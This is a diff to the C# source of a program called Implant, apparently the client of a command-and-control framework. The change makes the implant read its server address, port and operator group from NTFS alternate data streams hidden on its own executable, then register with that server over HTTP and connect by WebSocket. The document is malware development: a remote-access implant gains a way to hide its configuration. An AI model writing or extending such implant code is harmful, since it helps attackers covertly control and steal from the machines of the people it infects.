@@ -16,6 +16,7 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Reflection;
 
 
 namespace Implant
@@ -28,10 +29,12 @@ namespace Implant
         public CancellationTokenSource CancellationTokenSource { get; set; }
     }
 
+
     public class Implant
     {
         private string _c2WsUrl;
         private string _group;
+        private string _base_url;
         private string _currentDir;
         private Dictionary<int, byte[]> _chunkSequences = new Dictionary<int, byte[]>();
         private bool _running;
@@ -46,10 +49,11 @@ namespace Implant
         private readonly ConcurrentDictionary<string, string> _uploadDestinations = new ConcurrentDictionary<string, string>();
 
 
-        public Implant(string c2WsUrl, string group = "default")
+        public Implant(string c2WsUrl, string group = "default", string base_url="127.0.0.1:4000")
         {
             _c2WsUrl = c2WsUrl;
             _group = group;
+            _base_url = base_url;
             _currentDir = Directory.GetCurrentDirectory();
             _running = true;
             _attacks = new List<Attack>();
@@ -717,7 +721,7 @@ namespace Implant
                 using (var client = new HttpClient())
                 {
                     var content = new StringContent(JsonConvert.SerializeObject(model), Encoding.UTF8, "application/json");
-                    await client.PostAsync($"http://127.0.0.1:4000/api/impl/new/{model.impl_id}", content);
+                    await client.PostAsync($"http://{_base_url}/api/impl/new/{model.impl_id}", content);
                     //await client.PostAsync($"{_c2WsUrl.Replace("ws://", "http://").Replace("wss://", "https://")}/api/impl/new/{model.impl_id}", content);
                 }
             }
@@ -870,15 +874,44 @@ namespace Implant
 
            try
             {
-                var c2WsUrl = "ws://127.0.0.1:4000/api/rcv";
-                var groupName = "Remote 2";
 
-                var implant = new Implant(c2WsUrl, groupName);
-                await implant.Run();
+
+                string exePath = System.Reflection.Assembly.GetExecutingAssembly().Location;
+                string route_adsPath = @"\\?\" + exePath + ":Route";
+                string port_adsPath = @"\\?\" + exePath + ":Port";
+                string group_adsPath = @"\\?\" + exePath + ":Group";
+
+                if (File.Exists(route_adsPath) && File.Exists(port_adsPath) && File.Exists(group_adsPath))
+                {
+                    string route = File.ReadAllText(route_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
+                    string port = File.ReadAllText(port_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
+                    string group = File.ReadAllText(group_adsPath).Replace(" ", "").Replace("\r", "").Replace("\n", "");
+
+                    string base_url = $"{route}:{port}";
+                    var c2WsUrl = $"ws://{base_url}/api/rcv";
+                    var groupName = $"{group}";
+
+                    Console.WriteLine(base_url);
+                    Console.WriteLine(groupName);
+                    Console.ReadKey(); // Espera a que el usuario presione una tecla
+                    var implant = new Implant(c2WsUrl, groupName, base_url);
+                    await implant.Run();
+
+                }
+                else
+                {
+                    Console.WriteLine("No se encontró el stream alternativo 'metadata'.");
+                    Console.ReadKey(); // Espera a que el usuario presione una tecla
+                }
+
+
+
             }
             catch (Exception ex)
             {
+                Console.WriteLine(ex);
                 Debug.WriteLine($"Error fatal: {ex}");
+                Console.ReadKey(); // Espera a que el usuario presione una tecla
             }
         }
     }
